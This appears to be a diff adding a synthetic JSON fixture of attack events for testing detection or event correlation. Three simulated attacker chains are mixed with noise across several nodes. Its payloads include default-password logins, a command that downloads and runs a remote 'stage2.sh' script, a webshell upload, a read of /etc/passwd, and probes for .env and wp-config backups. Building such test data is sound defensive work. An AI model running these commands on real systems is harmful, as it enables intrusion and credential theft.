@@ -1,0 +1,189 @@
+[
+  {
+    "event_id": "evt_stoch_a_1",
+    "timestamp": 1699999999.9843972,
+    "real_timestamp": 1700000000.0,
+    "source_ip": "198.51.85.42",
+    "target_node": "node_01",
+    "service": "http",
+    "event_type": "web_probe",
+    "payload": "GET /setup.php HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_a_2",
+    "timestamp": 1700000062.5202556,
+    "real_timestamp": 1700000062.5397418,
+    "source_ip": "198.51.85.42",
+    "target_node": "node_01",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN admin / admin123",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_a_3",
+    "timestamp": 1700000131.9957972,
+    "real_timestamp": 1700000131.9756248,
+    "source_ip": "198.51.85.42",
+    "target_node": "node_01",
+    "service": "ssh",
+    "event_type": "command_exec",
+    "payload": "curl -O http://cdn.io/stage2.sh && bash stage2.sh",
+    "causal_token": "token-jump-pivot-457"
+  },
+  {
+    "event_id": "evt_stoch_a_4",
+    "timestamp": 1700000182.3852007,
+    "real_timestamp": 1700000182.391661,
+    "source_ip": "198.51.85.42",
+    "target_node": "node_01",
+    "service": "http",
+    "event_type": "web_upload",
+    "payload": "POST /upload.php [webshell.php]",
+    "causal_token": "token-jump-pivot-457"
+  },
+  {
+    "event_id": "evt_stoch_b_1",
+    "timestamp": 1700000015.8232148,
+    "real_timestamp": 1700000015.8525043,
+    "source_ip": "203.0.48.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe port 22",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_2",
+    "timestamp": 1700000071.1452758,
+    "real_timestamp": 1700000071.1462588,
+    "source_ip": "203.0.48.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN root / 123456",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_3",
+    "timestamp": 1700000159.2535808,
+    "real_timestamp": 1700000159.2592022,
+    "source_ip": "203.0.48.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "auth_login",
+    "payload": "LOGIN root / password",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_b_4",
+    "timestamp": 1700000137.4772542,
+    "real_timestamp": 1700000137.4695818,
+    "source_ip": "203.0.48.88",
+    "target_node": "node_02",
+    "service": "ssh",
+    "event_type": "command_exec",
+    "payload": "uname -a && cat /etc/passwd",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_g_1",
+    "timestamp": 1700000030.3331692,
+    "real_timestamp": 1700000030.3528786,
+    "source_ip": "198.18.99.12",
+    "target_node": "node_03",
+    "service": "http",
+    "event_type": "web_probe",
+    "payload": "GET /.env HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_g_2",
+    "timestamp": 1700000097.884312,
+    "real_timestamp": 1700000097.9002998,
+    "source_ip": "198.18.99.12",
+    "target_node": "node_03",
+    "service": "http",
+    "event_type": "web_probe",
+    "payload": "GET /wp-config.php.bak HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_g_3",
+    "timestamp": 1700000108.9005177,
+    "real_timestamp": 1700000108.9039493,
+    "source_ip": "198.18.99.12",
+    "target_node": "node_03",
+    "service": "http",
+    "event_type": "auth_login",
+    "payload": "POST /login admin/admin",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_1",
+    "timestamp": 1700000282.933067,
+    "real_timestamp": 1700000282.9442835,
+    "source_ip": "198.18.243.1",
+    "target_node": "node-1",
+    "service": "ssh",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_2",
+    "timestamp": 1700000051.7511647,
+    "real_timestamp": 1700000051.7486277,
+    "source_ip": "198.18.208.2",
+    "target_node": "node-2",
+    "service": "ntp",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_3",
+    "timestamp": 1700000171.8525662,
+    "real_timestamp": 1700000171.8822408,
+    "source_ip": "198.18.210.3",
+    "target_node": "node-3",
+    "service": "http",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_4",
+    "timestamp": 1700000109.6863387,
+    "real_timestamp": 1700000109.7164342,
+    "source_ip": "198.18.247.4",
+    "target_node": "node-1",
+    "service": "ssh",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_5",
+    "timestamp": 1700000216.3928967,
+    "real_timestamp": 1700000216.4203107,
+    "source_ip": "198.18.215.5",
+    "target_node": "node-2",
+    "service": "ntp",
+    "event_type": "web_probe",
+    "payload": "GET /robots.txt HTTP/1.1",
+    "causal_token": null
+  },
+  {
+    "event_id": "evt_stoch_noise_6",
+    "timestamp": 1700000131.0330596,
+    "real_timestamp": 1700000131.0081222,
+    "source_ip": "198.18.218.6",
+    "target_node": "node-3",
+    "service": "http",
+    "event_type": "port_scan",
+    "payload": "TCP SYN probe",
+    "causal_token": null
+  }
+]
